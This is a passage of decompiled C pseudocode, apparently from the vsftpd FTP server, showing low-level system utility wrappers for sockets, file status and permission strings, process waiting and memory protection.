  LODWORD(v2[0]) = v0;
  return v2[0];
}
// 12CC0: using guessed type __int64 sub_12CC0();

//----- (0000000000012D40) ----------------------------------------------------
__int64 sub_12D40()
{
  __pid_t v0; // ebx

  v0 = waitpid(-1, 0LL, 1);
  if ( v0 < 0 )
  {
    if ( *__errno_location() != 10 )
      sub_4B80();
    return 0;
  }
  return (unsigned int)v0;
}
// 12D40: using guessed type __int64 sub_12D40();

//----- (0000000000012D90) ----------------------------------------------------
__int64 __fastcall sub_12D90(unsigned int *a1)
{
  return *a1;
}

//----- (0000000000012DA0) ----------------------------------------------------
_BOOL8 __fastcall sub_12DA0(__int64 a1)
{
  return (*(_BYTE *)(a1 + 4) & 0x7F) == 0;
}

//----- (0000000000012DB0) ----------------------------------------------------
__int64 __fastcall sub_12DB0(__int64 a1)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  if ( (v1 & 0x7F) != 0 )
    sub_4B30("not a normal exit in vsf_sysutil_wait_get_exitcode");
  return BYTE1(v1);
}

//----- (0000000000012DE0) ----------------------------------------------------
unsigned __int64 __fastcall sub_12DE0(int a1)
{
  int optval; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  optval = 1;
  v3 = __readfsqword(0x28u);
  if ( setsockopt(a1, 1, 9, &optval, 4u) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000012E40) ----------------------------------------------------
unsigned __int64 __fastcall sub_12E40(int a1)
{
  int optval; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  optval = 1;
  v3 = __readfsqword(0x28u);
  if ( setsockopt(a1, 1, 2, &optval, 4u) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000012EA0) ----------------------------------------------------
unsigned __int64 __fastcall sub_12EA0(int a1)
{
  int optval; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  optval = 1;
  v3 = __readfsqword(0x28u);
  if ( setsockopt(a1, 6, 1, &optval, 4u) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000012F00) ----------------------------------------------------
int __fastcall sub_12F00(int a1)
{
  int result; // eax

  if ( dword_2208AC == -1 )
    dword_2208AC = sub_16AA0();
  result = fcntl(a1, 8);
  if ( result )
    sub_4B80();
  return result;
}
// 16AA0: using guessed type __int64 sub_16AA0(void);
// 2208AC: using guessed type int dword_2208AC;

//----- (0000000000012F60) ----------------------------------------------------
unsigned __int64 __fastcall sub_12F60(int a1)
{
  int optval; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  optval = 1;
  v3 = __readfsqword(0x28u);
  if ( setsockopt(a1, 1, 10, &optval, 4u) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000012FC0) ----------------------------------------------------
unsigned __int64 __fastcall sub_12FC0(int a1)
{
  int optval; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  optval = 8;
  v3 = __readfsqword(0x28u);
  setsockopt(a1, 0, 1, &optval, 4u);
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000013010) ----------------------------------------------------
unsigned __int64 __fastcall sub_13010(int fd)
{
  __int64 v2; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-20h]

  v3 = __readfsqword(0x28u);
  sub_121A0(&v2, 8u);
  v2 = 0x7FFF00000001LL;
  if ( setsockopt(fd, 1, 13, &v2, 8u) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000013090) ----------------------------------------------------
unsigned __int64 __fastcall sub_13090(int a1)
{
  __int64 v2; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v2 = 0LL;
  v3 = __readfsqword(0x28u);
  setsockopt(a1, 1, 13, &v2, 8u);
  return __readfsqword(0x28u) ^ v3;
}

//----- (00000000000130E0) ----------------------------------------------------
int __fastcall sub_130E0(int fd)
{
  int v1; // eax
  int result; // eax

  v1 = fcntl(fd, 3);
  if ( v1 < 0 )
    sub_4B80();
  BYTE1(v1) |= 8u;
  result = fcntl(fd, 4, (unsigned int)v1);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000013150) ----------------------------------------------------
int __fastcall sub_13150(int fd)
{
  int v1; // eax
  int result; // eax

  v1 = fcntl(fd, 3);
  if ( v1 < 0 )
    sub_4B80();
  BYTE1(v1) &= ~8u;
  result = fcntl(fd, 4, (unsigned int)v1);
  if ( result )
    sub_4B80();
  return result;
}

//----- (00000000000131C0) ----------------------------------------------------
__int64 __fastcall sub_131C0(unsigned int fd, void *buf, size_t n)
{
  size_t v3; // rbx
  int *v4; // r14
  signed int v5; // r13d
  int v6; // r12d

  v3 = (unsigned int)n;
  v4 = __errno_location();
  do
  {
    v5 = recv(fd, buf, v3, 2);
    v6 = *v4;
    sub_12360(1, v5, fd);
  }
  while ( v5 < 0 && v6 == 4 );
  return (unsigned int)v5;
}

//----- (0000000000013230) ----------------------------------------------------
__int64 __fastcall sub_13230(const char *a1)
{
  return strtol(a1, 0LL, 10);
}

//----- (0000000000013250) ----------------------------------------------------
__int64 __fastcall sub_13250(const char *a1)
{
  unsigned int v1; // eax
  __int64 v2; // rdx
  int v3; // edx
  unsigned int v4; // esi
  __int64 v5; // rcx
  __int64 result; // rax
  __int64 v7; // rdx
  __int64 v8; // rdx

  v1 = strlen(a1);
  if ( v1 > 0xFFFFFFF )
    sub_4B80();
  v2 = v1 - 1;
  if ( (unsigned int)v2 > 0xE )
    return 0LL;
  v3 = a1[v2];
  if ( (unsigned __int8)(v3 - 48) > 9u )
    return 0LL;
  v4 = v1 - 2;
  v5 = 1LL;
  result = 0LL;
  while ( 1 )
  {
    v8 = v5 * (v3 - 48);
    v5 *= 10LL;
    result += v8;
    if ( v4 == -1 )
      break;
    v7 = v4--;
    v3 = a1[v7];
    if ( (unsigned __int8)(v3 - 48) > 9u )
      return 0LL;
  }
  return result;
}

//----- (00000000000132D0) ----------------------------------------------------
void *__fastcall sub_132D0(__int64 a1)
{
  __snprintf_chk(&unk_220F60, 32LL, 1LL, 32LL, "%lu", a1);
  return &unk_220F60;
}
// 3B50: using guessed type __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...);

//----- (0000000000013310) ----------------------------------------------------
void *__fastcall sub_13310(__int64 a1)
{
  __snprintf_chk(&unk_220F40, 32LL, 1LL, 32LL, "%ld", a1);
  return &unk_220F40;
}
// 3B50: using guessed type __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...);

//----- (0000000000013350) ----------------------------------------------------
void *__fastcall sub_13350(double a1)
{
  __snprintf_chk(&unk_220F20, 32LL, 1LL, 32LL, "%.2f", a1);
  return &unk_220F20;
}
// 3B50: using guessed type __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...);

//----- (0000000000013390) ----------------------------------------------------
__int16 *__fastcall sub_13390(unsigned int a1)
{
  if ( a1 )
    __snprintf_chk(&word_220F00, 32LL, 1LL, 32LL, "0%o", a1);
  else
    word_220F00 = 48;
  return &word_220F00;
}
// 3B50: using guessed type __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...);
// 220F00: using guessed type __int16 word_220F00;

//----- (00000000000133F0) ----------------------------------------------------
__int64 __fastcall sub_133F0(char *a1)
{
  __int64 v1; // rbx
  char *v2; // rbp
  const unsigned __int16 **v3; // rax
  char v4; // cl
  const unsigned __int16 *v5; // rsi
  __int64 result; // rax
  char v7; // di

  v1 = *a1;
  if ( !(_BYTE)v1 )
    return 0LL;
  v2 = a1;
  v3 = __ctype_b_loc();
  v4 = 0;
  v5 = *v3;
  result = 0LL;
  do
  {
    if ( (v5[v1] & 0x800) == 0 || (char)v1 > 55 )
      break;
    if ( (char)v1 == 48 )
    {
      v7 = v4;
      v4 = 0;
      if ( (v7 & 1) == 0 )
        continue;
    }
    result = (unsigned int)((char)v1 + 8 * result - 48);
    v4 = 1;
    v1 = *++v2;
  }
  while ( (_BYTE)v1 );
  return result;
}

//----- (0000000000013460) ----------------------------------------------------
__int64 __fastcall sub_13460(unsigned int a1)
{
  unsigned int v1; // ebx

  v1 = a1;
  if ( a1 + 128 <= 0x17F )
    return (unsigned int)(*__ctype_toupper_loc())[a1];
  return v1;
}

//----- (0000000000013490) ----------------------------------------------------
__int64 __fastcall sub_13490(int a1)
{
  return (*__ctype_b_loc())[a1] & 0x2000;
}

//----- (00000000000134B0) ----------------------------------------------------
__int64 __fastcall sub_134B0(int a1)
{
  if ( (a1 & 0x7Fu) <= 0x1F || (_BYTE)a1 == 0xB1 )
    return 0LL;
  else
    return (*__ctype_b_loc())[a1] & 0x4000;
}

//----- (00000000000134F0) ----------------------------------------------------
__int64 __fastcall sub_134F0(int a1)
{
  return (*__ctype_b_loc())[a1] & 8;
}

//----- (0000000000013510) ----------------------------------------------------
__int64 __fastcall sub_13510(int a1)
{
  return (*__ctype_b_loc())[a1] & 0x800;
}

//----- (0000000000013530) ----------------------------------------------------
char *__fastcall sub_13530(char *a1, unsigned int a2)
{
  char *result; // rax

  result = a1;
  if ( a2 )
  {
    result = getcwd(a1, a2);
    a1[a2 - 1] = 0;
  }
  return result;
}

//----- (00000000000135C0) ----------------------------------------------------
int __fastcall sub_135C0(DIR *a1)
{
  int result; // eax

  result = closedir(a1);
  if ( result )
    sub_4B80();
  return result;
}

//----- (00000000000135F0) ----------------------------------------------------
char *__fastcall sub_135F0(DIR *a1)
{
  struct dirent64 *v1; // rax
  char *d_name; // rdx
  bool v3; // zf
  char *result; // rax

  v1 = readdir64(a1);
  d_name = v1->d_name;
  v3 = v1 == 0LL;
  result = 0LL;
  if ( !v3 )
    return d_name;
  return result;
}

//----- (0000000000013610) ----------------------------------------------------
size_t __fastcall sub_13610(const char *a1)
{
  size_t result; // rax

  result = strlen(a1);
  if ( (unsigned int)result > 0xFFFFFFF )
    sub_4B80();
  return result;
}

//----- (0000000000013650) ----------------------------------------------------
void *__fastcall sub_13650(void *a1, unsigned int a2)
{
  void *result; // rax

  if ( a2 )
    return sub_121A0(a1, a2);
  return result;
}

//----- (0000000000013670) ----------------------------------------------------
void *__fastcall sub_13670(void *a1, const void *a2, int a3)
{
  void *result; // rax

  if ( a3 )
    return sub_12250(a1, a2, a3);
  return result;
}

//----- (0000000000013690) ----------------------------------------------------
__int64 __fastcall sub_13690(char *a1, const char *a2, unsigned int a3)
{
  __int64 result; // rax

  if ( a3 )
    return sub_122A0(a1, a2, a3);
  return result;
}

//----- (00000000000136B0) ----------------------------------------------------
int __fastcall sub_136B0(const void *a1, const void *a2, unsigned int a3)
{
  if ( a3 )
    return memcmp(a1, a2, a3);
  else
    return 0;
}

//----- (00000000000136E0) ----------------------------------------------------
int sub_136E0()
{
  int result; // eax

  result = dword_220EEC;
  if ( !dword_220EEC )
  {
    result = getpagesize();
    dword_220EEC = result;
    if ( !result )
      sub_4B80();
  }
  return result;
}
// 220EEC: using guessed type int dword_220EEC;

//----- (0000000000013730) ----------------------------------------------------
int __fastcall sub_13730(void *addr, size_t len, int a3)
{
  int v3; // ebx
  int result; // eax

  v3 = 1;
  if ( a3 != 1 )
  {
    v3 = 0;
    if ( a3 != 2 )
      sub_4B30("bad value in vsf_sysutil_translate_memprot");
  }
  result = mprotect(addr, (unsigned int)len, v3);
  if ( result )
    sub_4B80();
  return result;
}

//----- (00000000000137A0) ----------------------------------------------------
int __fastcall sub_137A0(void *a1, unsigned int a2)
{
  int result; // eax

  result = munmap(a1, a2);
  if ( result )
    sub_4B80();
  return result;
}

//----- (00000000000137D0) ----------------------------------------------------
__int64 __fastcall sub_137D0(__int64 a1, int a2)
{
  unsigned int v2; // ebx

  v2 = 2049;
  if ( a2 != 2 )
  {
    v2 = 2050;
    if ( a2 != 3 )
    {
      v2 = 2048;
      if ( a2 != 1 )
        sub_4B30("bad mode in vsf_sysutil_translate_openmode");
    }
  }
  return __open64_2(a1, v2);
}
// 3FD0: using guessed type __int64 __fastcall __open64_2(_QWORD, _QWORD);

//----- (0000000000013840) ----------------------------------------------------
int __fastcall sub_13840(const char *a1, unsigned int a2)
{
  return open64(a1, 2113, a2);
}

//----- (0000000000013850) ----------------------------------------------------
int __fastcall sub_13850(const char *a1, unsigned int a2)
{
  return open64(a1, 3137, a2);
}

//----- (0000000000013860) ----------------------------------------------------
int __fastcall sub_13860(int a1, int a2)
{
  int result; // eax

  if ( a1 != a2 )
    return sub_122C0(a1, a2);
  return result;
}

//----- (0000000000013880) ----------------------------------------------------
int __fastcall sub_13880(int fd)
{
  int result; // eax

  while ( 1 )
  {
    result = close(fd);
    if ( !result )
      break;
    if ( *__errno_location() != 4 )
      sub_4B80();
    sub_12360(0, 0, 0);
  }
  return result;
}

//----- (00000000000138E0) ----------------------------------------------------
_BOOL8 __fastcall sub_138E0(const char *a1)
{
  return access(a1, 2) == 0;
}

//----- (0000000000013900) ----------------------------------------------------
int __fastcall sub_13900(int fildes, struct stat64 **a2)
{
  struct stat64 *v2; // rdx
  int result; // eax

  v2 = *a2;
  if ( !*a2 )
  {
    v2 = (struct stat64 *)sub_12AE0(0x90uLL);
    *a2 = v2;
  }
  result = __fxstat64(1, fildes, v2);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000013960) ----------------------------------------------------
int __fastcall sub_13960(char *filename, struct stat64 **a2)
{
  struct stat64 *v2; // rdx

  v2 = *a2;
  if ( !*a2 )
  {
    v2 = (struct stat64 *)sub_12AE0(0x90uLL);
    *a2 = v2;
  }
  return __xstat64(1, filename, v2);
}

//----- (00000000000139B0) ----------------------------------------------------
int __fastcall sub_139B0(char *filename, struct stat64 **a2)
{
  struct stat64 *v2; // rdx

  v2 = *a2;
  if ( !*a2 )
  {
    v2 = (struct stat64 *)sub_12AE0(0x90uLL);
    *a2 = v2;
  }
  return __lxstat64(1, filename, v2);
}

//----- (0000000000013A00) ----------------------------------------------------
int __fastcall sub_13A00(DIR *a1, struct stat64 **a2)
{
  int v2; // eax

  v2 = dirfd(a1);
  return sub_13900(v2, a2);
}

//----- (0000000000013A20) ----------------------------------------------------
_BOOL8 __fastcall sub_13A20(__int64 a1)
{
  return (*(_DWORD *)(a1 + 24) & 0xF000) == 0x8000;
}

//----- (0000000000013A40) ----------------------------------------------------
_BOOL8 __fastcall sub_13A40(__int64 a1)
{
  return (*(_DWORD *)(a1 + 24) & 0xF000) == 40960;
}

//----- (0000000000013A60) ----------------------------------------------------
_BOOL8 __fastcall sub_13A60(__int64 a1)
{
  return (*(_DWORD *)(a1 + 24) & 0xF000) == 49152;
}

//----- (0000000000013A80) ----------------------------------------------------
_BOOL8 __fastcall sub_13A80(__int64 a1)
{
  return (*(_DWORD *)(a1 + 24) & 0xF000) == 0x4000;
}

//----- (0000000000013AA0) ----------------------------------------------------
char *__fastcall sub_13AA0(__int64 a1)
{
  char *v1; // rax
  int v2; // eax
  unsigned int v3; // edx
  char v4; // dl
  char v5; // dl
  char v6; // al

  v1 = &byte_220EE0;
  do
    *v1++ = 45;
  while ( v1 != &byte_220EE0 + 10 );
  v2 = *(_DWORD *)(a1 + 24);
  byte_220EE0 = 63;
  v3 = v2 & 0xF000;
  if ( v3 == 24576 )
  {
    byte_220EE0 = 98;
  }
  else if ( v3 <= 0x6000 )
  {
    switch ( v3 )
    {
      case 0x2000u:
        byte_220EE0 = 99;
        break;
      case 0x4000u:
        byte_220EE0 = 100;
        break;
      case 0x1000u:
        byte_220EE0 = 112;
        break;
    }
  }
  else
  {
    switch ( v3 )
    {
      case 0xA000u:
        byte_220EE0 = 108;
        break;
      case 0xC000u:
        byte_220EE0 = 115;
        break;
      case 0x8000u:
        byte_220EE0 = 45;
        break;
    }
  }
  if ( (v2 & 0x100) != 0 )
    byte_220EE1 = 114;
  if ( (v2 & 0x80u) != 0 )
    byte_220EE2 = 119;
  if ( (v2 & 0x40) != 0 )
    byte_220EE3 = 120;
  if ( (v2 & 0x20) != 0 )
    byte_220EE4 = 114;
  if ( (v2 & 0x10) != 0 )
    byte_220EE5 = 119;
  if ( (v2 & 8) != 0 )
    byte_220EE6 = 120;
  if ( (v2 & 4) != 0 )
    byte_220EE7 = 114;
  if ( (v2 & 2) != 0 )
    byte_220EE8 = 119;
  if ( (v2 & 1) != 0 )
    byte_220EE9 = 120;
  if ( (v2 & 0x800) != 0 )
  {
    v4 = 115;
    if ( byte_220EE3 != 120 )
      v4 = 83;
    byte_220EE3 = v4;
  }
  if ( (v2 & 0x400) != 0 )
  {
    v5 = 115;
    if ( byte_220EE6 != 120 )
      v5 = 83;
    byte_220EE6 = v5;
  }
  if ( (v2 & 0x200) != 0 )
  {
    v6 = 116;
    if ( byte_220EE9 != 120 )
      v6 = 84;
    byte_220EE9 = v6;
  }
  byte_220EEA = 0;
  return &byte_220EE0;
}
// 220EE0: using guessed type char byte_220EE0;
// 220EE1: using guessed type char byte_220EE1;
// 220EE2: using guessed type char byte_220EE2;
// 220EE3: using guessed type char byte_220EE3;
// 220EE4: using guessed type char byte_220EE4;
// 220EE5: using guessed type char byte_220EE5;
// 220EE6: using guessed type char byte_220EE6;
// 220EE7: using guessed type char byte_220EE7;
// 220EE8: using guessed type char byte_220EE8;
// 220EE9: using guessed type char byte_220EE9;
// 220EEA: using guessed type char byte_220EEA;

//----- (0000000000013C60) ----------------------------------------------------
char *__fastcall sub_13C60(__int64 a1, int a2, __int64 a3)
{
  const time_t *v4; // rdi
  struct tm *v6; // rax
  __int64 v7; // rsi
  const char *v8; // rdx
  int v9; // eax

  v4 = (const time_t *)(a1 + 88);
  if ( a2 )
    v6 = localtime(v4);
  else
    v6 = gmtime(v4);
  v7 = *(_QWORD *)(a1 + 88);
  v8 = "%b %d  %Y";
  if ( v7 <= a3 && a3 - v7 <= 15724800 )
    v8 = "%b %d %H:%M";
  v9 = strftime(s, 0x40uLL, v8, v6);
  byte_220EDF = 0;
  if ( !v9 )
    sub_4B80();
  return s;
}
// 220EDF: using guessed type char byte_220EDF;

//----- (0000000000013CF0) ----------------------------------------------------
char *__fastcall sub_13CF0(__int64 a1, int a2)
{
  const time_t *v2; // rdi
  struct tm *v3; // rax

  v2 = (const time_t *)(a1 + 88);
  if ( a2 )
    v3 = localtime(v2);
  else
    v3 = gmtime(v2);
  if ( !(unsigned int)strftime(byte_220E80, 0xFuLL, "%Y%m%d%H%M%S", v3) )
    sub_4B80();
  return byte_220E80;
}

//----- (0000000000013D50) ----------------------------------------------------
__int64 __fastcall sub_13D50(__int64 a1)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 48);
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000013D80) ----------------------------------------------------
__int64 __fastcall sub_13D80(__int64 a1)
{
  return *(unsigned int *)(a1 + 28);
}

//----- (0000000000013D90) ----------------------------------------------------
__int64 __fastcall sub_13D90(__int64 a1)
{
  return *(unsigned int *)(a1 + 32);
}

//----- (0000000000013DA0) ----------------------------------------------------
__int64 __fastcall sub_13DA0(__int64 a1)
{
  return *(_QWORD *)(a1 + 16);
}

//----- (0000000000013DB0) ----------------------------------------------------
__int64 __fastcall sub_13DB0(__int64 a1)
{
  return (*(_DWORD *)(a1 + 24) >> 2) & 1;
}

//----- (0000000000013DC0) ----------------------------------------------------
void *__fastcall sub_13DC0(__int64 a1)
{
  __snprintf_chk(&unk_220E60, 32LL, 1LL, 32LL, "%030ld", *(_QWORD *)(a1 + 88));
  return &unk_220E60;
}
// 3B50: using guessed type __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...);

//----- (0000000000013E00) ----------------------------------------------------
int __fastcall sub_13E00(int a1, __uid_t a2, __gid_t a3)
{
  int result; // eax

  result = fchown(a1, a2, a3);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000013E30) ----------------------------------------------------
int __fastcall sub_13E30(int a1, __int16 a2)
{
  int result; // eax

  result = fchmod(a1, a2 & 0x1FF);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000013E60) ----------------------------------------------------
int __fastcall sub_13E60(const char *a1, __int16 a2)
{
  return chmod(a1, a2 & 0x1FF);
}

//----- (0000000000013E70) ----------------------------------------------------
__int64 __fastcall sub_13E70(int a1)
{
  return sub_12440(a1, 1);
}

//----- (0000000000013E80) ----------------------------------------------------
__int64 __fastcall sub_13E80(int a1)
{
  return sub_12440(a1, 0);
}

//----- (0000000000013E90) ----------------------------------------------------
unsigned __int64 __fastcall sub_13E90(int fd)
{
  int v2; // [rsp+0h] [rbp-48h] BYREF
  __int64 v3; // [rsp+8h] [rbp-40h]
  __int64 v4; // [rsp+10h] [rbp-38h]
  unsigned __int64 v5; // [rsp+28h] [rbp-20h]

  v5 = __readfsqword(0x28u);
  sub_121A0(&v2, 0x20u);
  v2 = 2;
  v3 = 0LL;
  v4 = 0LL;
  if ( fcntl(fd, 6, &v2) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v5;
}

//----- (0000000000013F10) ----------------------------------------------------
ssize_t __fastcall sub_13F10(const char *a1, char *a2, int a3)
{
  ssize_t result; // rax

  if ( !a3 )
    return 0xFFFFFFFFLL;
  result = readlink(a1, a2, (unsigned int)(a3 - 1));
  if ( (int)result >= 0 )
    a2[(int)result] = 0;
  return result;
}

//----- (0000000000013F40) ----------------------------------------------------
__int64 __fastcall sub_13F40(unsigned int a1)
{
  return a1 >> 31;
}

//----- (0000000000013F50) ----------------------------------------------------
__int64 sub_13F50()
{
  int v0; // edx
  __int64 result; // rax

  v0 = *__errno_location();
  if ( v0 == 22 )
    return 5LL;
  if ( v0 <= 22 )
  {
    result = 4LL;
    if ( v0 != 4 )
    {
      result = 7LL;
      if ( v0 != 13 )
      {
        result = 8LL;
        if ( v0 != 2 )
          return 1LL;
      }
    }
  }
  else
  {
    result = 6LL;
    if ( v0 != 95 )
    {
      result = 2LL;
      if ( v0 != 98 )
      {
        result = 3LL;
        if ( v0 != 38 )
          return 1LL;
      }
    }
  }
  return result;
}
// 13F50: using guessed type __int64 sub_13F50();

//----- (0000000000013FC0) ----------------------------------------------------
int sub_13FC0()
{
  int result; // eax

  result = socket(2, 1, 6);
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000014010) ----------------------------------------------------
int sub_14010()
{
  int result; // eax

  result = socket(10, 1, 6);
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000014060) ----------------------------------------------------
__int64 sub_14060()
{
  __int64 v1[3]; // [rsp+0h] [rbp-18h] BYREF

  v1[1] = __readfsqword(0x28u);
  if ( socketpair(1, 1, 0, (int *)v1) )
    sub_4B80();
  return v1[0];
}
// 14060: using guessed type __int64 sub_14060();

//----- (00000000000140D0) ----------------------------------------------------
int __fastcall sub_140D0(int fd, const struct sockaddr *a2)
{
  socklen_t v2; // edx

  v2 = 16;
  if ( a2->sa_family != 2 )
  {
    v2 = 28;
    if ( a2->sa_family != 10 )
      sub_4B80();
  }
  return bind(fd, a2, v2);
}

//----- (0000000000014120) ----------------------------------------------------
__int64 __fastcall sub_14120(int a1, int a2)
{
  int v2; // ebx

  v2 = listen(a1, a2);
  if ( v2 < 0 && (unsigned int)sub_13F50() != 2 )
    sub_4B80();
  return (unsigned int)v2;
}
// 13F50: using guessed type __int64 sub_13F50(void);

//----- (0000000000014150) ----------------------------------------------------
__int64 __fastcall sub_14150(int fd, void *a2, unsigned int a3)
{
  __int64 v4; // rax
  int *v5; // r12
  int i; // eax
  int v7; // r13d
  int v8; // ebx
  int v9; // ebx
  socklen_t addr_len; // [rsp+1Ch] [rbp-FCh] BYREF
  struct timeval v12; // [rsp+20h] [rbp-F8h] BYREF
  struct sockaddr addr; // [rsp+30h] [rbp-E8h] BYREF
  fd_set readfds; // [rsp+50h] [rbp-C8h] BYREF
  unsigned __int64 v15; // [rsp+D8h] [rbp-40h]

  v15 = __readfsqword(0x28u);
  addr_len = 28;
  if ( a2 )
    sub_121A0(a2, 0x1Cu);
  if ( !a3 )
    goto LABEL_9;
  memset(&readfds, 0, sizeof(readfds));
  v4 = __fdelt_chk(fd);
  v12.tv_usec = 0LL;
  readfds.fds_bits[v4] |= 1LL << (fd % 64);
  v12.tv_sec = a3;
  v5 = __errno_location();
  for ( i = select(fd + 1, &readfds, 0LL, 0LL, &v12); ; i = select(fd + 1, &readfds, 0LL, 0LL, &v12) )
  {
    v7 = i;
    v8 = *v5;
    sub_12360(0, 0, 0);
    if ( v7 >= 0 || v8 != 4 )
      break;
  }
  if ( !v7 )
  {
    *v5 = 11;
    return (unsigned int)-1;
  }
  else
  {
LABEL_9:
    v9 = accept(fd, &addr, &addr_len);
    sub_12360(0, 0, 0);
    if ( v9 >= 0 )
    {
      if ( addr_len )
      {
        if ( (addr.sa_family & 0xFFF7) != 2 )
          sub_4B80();
        if ( a2 )
        {
          if ( addr.sa_family == 2 )
          {
            sub_121A0(&addr.sa_data[6], 8u);
            sub_12250(a2, &addr, 16);
          }
          else
          {
            sub_12250(a2, &addr, 28);
          }
        }
      }
      else
      {
        return (unsigned int)-1;
      }
    }
  }
  return (unsigned int)v9;
}
// 3D60: using guessed type __int64 __fastcall __fdelt_chk(_QWORD);

//----- (0000000000014330) ----------------------------------------------------
__int64 __fastcall sub_14330(int fd, const struct sockaddr *a2, unsigned int a3)
{
  socklen_t v4; // edx
  int v5; // r13d
  int *v7; // r12
  __int64 v8; // rax
  int i; // eax
  int v10; // r13d
  socklen_t len; // [rsp+0h] [rbp-F8h]
  int optval; // [rsp+18h] [rbp-E0h] BYREF
  socklen_t optlen; // [rsp+1Ch] [rbp-DCh] BYREF
  struct timeval v14; // [rsp+20h] [rbp-D8h] BYREF
  fd_set writefds; // [rsp+30h] [rbp-C8h] BYREF
  unsigned __int64 v16; // [rsp+B8h] [rbp-40h]

  v4 = 16;
  v16 = __readfsqword(0x28u);
  if ( a2->sa_family != 2 )
  {
    v4 = 28;
    if ( a2->sa_family != 10 )
      sub_4B80();
  }
  if ( a3 )
  {
    len = v4;
    sub_130E0(fd);
    optval = connect(fd, a2, len);
    if ( optval >= 0 || (v7 = __errno_location(), *v7 != 115) )
    {
LABEL_9:
      sub_13150(fd);
      return (unsigned int)optval;
    }
LABEL_11:
    memset(&writefds, 0, sizeof(writefds));
    v8 = __fdelt_chk(fd);
    v14.tv_usec = 0LL;
    writefds.fds_bits[v8] |= 1LL << (fd % 64);
    v14.tv_sec = a3;
    for ( i = select(fd + 1, 0LL, &writefds, 0LL, &v14); ; i = select(fd + 1, 0LL, &writefds, 0LL, &v14) )
    {
      optval = i;
      v10 = *v7;
      sub_12360(0, 0, 0);
      if ( optval >= 0 || v10 != 4 )
        break;
    }
    if ( optval )
    {
      optlen = 4;
      if ( getsockopt(fd, 1, 4, &optval, &optlen) )
        sub_4B80();
    }
    else
    {
      optval = -1;
      *v7 = 11;
    }
    if ( !a3 )
      return (unsigned int)optval;
    goto LABEL_9;
  }
  v5 = connect(fd, a2, v4);
  optval = v5;
  if ( v5 < 0 )
  {
    v7 = __errno_location();
    if ( *v7 == 115 )
      goto LABEL_11;
  }
  return (unsigned int)v5;
}
// 3D60: using guessed type __int64 __fastcall __fdelt_chk(_QWORD);

//----- (0000000000014530) ----------------------------------------------------
int __fastcall sub_14530(int a1)
{
  return shutdown(a1, 2);
}

//----- (0000000000014540) ----------------------------------------------------
int __fastcall sub_14540(int a1)
{
  return shutdown(a1, 0);
}

//----- (0000000000014550) ----------------------------------------------------
void __fastcall sub_14550(void **a1)
{
  if ( *a1 )
  {
    free(*a1);
    *a1 = 0LL;
  }
}

//----- (0000000000014580) ----------------------------------------------------
void *__fastcall sub_14580(void **a1)
{
  void *v2; // rdi
  void *v3; // rax

  v2 = *a1;
  if ( v2 )
  {
    free(v2);
    *a1 = 0LL;
  }
  v3 = sub_12AE0(0x1CuLL);
  *a1 = v3;
  return sub_121A0(v3, 0x1Cu);
}

//----- (00000000000145C0) ----------------------------------------------------
unsigned __int64 __fastcall sub_145C0(int fd, void **a2)
{
  void *v3; // rdi
  int v4; // edx
  void *v5; // rdi
  socklen_t len; // [rsp+Ch] [rbp-4Ch] BYREF
  struct sockaddr addr; // [rsp+10h] [rbp-48h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-20h]

  v3 = *a2;
  v9 = __readfsqword(0x28u);
  len = 28;
  if ( v3 )
  {
    free(v3);
    *a2 = 0LL;
  }
  if ( getsockname(fd, &addr, &len) )
    sub_4B80();
  if ( (addr.sa_family & 0xFFF7) != 2 )
    sub_4B80();
  sub_14580(a2);
  v4 = len;
  if ( len <= 0x1C )
  {
    if ( !len )
      return __readfsqword(0x28u) ^ v9;
    v5 = *a2;
  }
  else
  {
    v5 = *a2;
    len = 28;
    v4 = 28;
  }
  sub_12250(v5, &addr, v4);
  return __readfsqword(0x28u) ^ v9;
}

//----- (00000000000146B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_146B0(int fd, void **a2)
{
  void *v3; // rdi
  int v4; // edx
  void *v5; // rdi
  socklen_t len; // [rsp+Ch] [rbp-4Ch] BYREF
  struct sockaddr addr; // [rsp+10h] [rbp-48h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-20h]

  v3 = *a2;
  v9 = __readfsqword(0x28u);
  len = 28;
  if ( v3 )
  {
    free(v3);
    *a2 = 0LL;
  }
  if ( getpeername(fd, &addr, &len) )
    sub_4B80();
  if ( (addr.sa_family & 0xFFF7) != 2 )
    sub_4B80();
  sub_14580(a2);
  v4 = len;
